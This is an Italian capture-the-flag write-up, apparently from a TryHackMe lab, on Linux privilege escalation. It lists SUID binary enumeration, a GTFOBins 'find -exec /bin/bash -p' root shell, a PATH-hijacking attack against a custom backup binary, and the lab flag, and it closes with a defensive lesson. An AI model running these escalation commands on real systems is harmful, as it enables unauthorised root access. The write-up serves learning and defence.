---
title: "Linux Privilege Escalation — SUID Binaries"
date: "2026-10-01"
category: "TryHackMe"
platform: "TryHackMe"
difficulty: "Medium"
tags:
  - linux
  - privilege-escalation
  - SUID
  - red-team
---

## Introduzione

La privilege escalation tramite **SUID binaries** è una delle tecniche più comuni per ottenere root su sistemi Linux mal configurati. In questa writeup analizziamo il percorso completo dalla shell utente a root.

## Ricognizione

Dopo aver ottenuto una shell come utente `www-data`, il primo step è enumerare i binari con il bit SUID settato:

```bash
find / -perm -4000 -type f 2>/dev/null
```

### Output

```
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/custom-backup
/usr/bin/find
```

Il binario `/usr/bin/find` con SUID è un vettore noto.

## Exploitation

Consultando [GTFOBins](https://gtfobins.github.io/gtfobins/find/), possiamo eseguire:

```bash
find . -exec /bin/bash -p \; -quit
```

Questo ci fornisce una shell con permessi elevati:

```
bash-5.1# whoami
root
bash-5.1# id
uid=33(www-data) gid=33(www-data) euid=0(root)
```

## Custom Binary Analysis

Il binario `/usr/local/bin/custom-backup` è particolarmente interessante:

```bash
strings /usr/local/bin/custom-backup
```

Rivela che chiama `tar` senza percorso assoluto, permettendo un attacco di **PATH hijacking**:

```bash
cd /tmp
echo '/bin/bash -p' > tar
chmod +x tar
export PATH=/tmp:$PATH
/usr/local/bin/custom-backup
```

## Flag

```
cat /root/flag.txt
# THM{su1d_pr1v3sc_m4st3r_2026}
```

## Lezioni apprese

- Controllare sempre i binari SUID: sono uno dei vettori più comuni.
- GTFOBins è una risorsa essenziale per la privilege escalation.
- Il PATH hijacking è un attacco sottovalutato ma efficace.
- La difesa: utilizzare sempre percorsi assoluti negli script privilegiati.
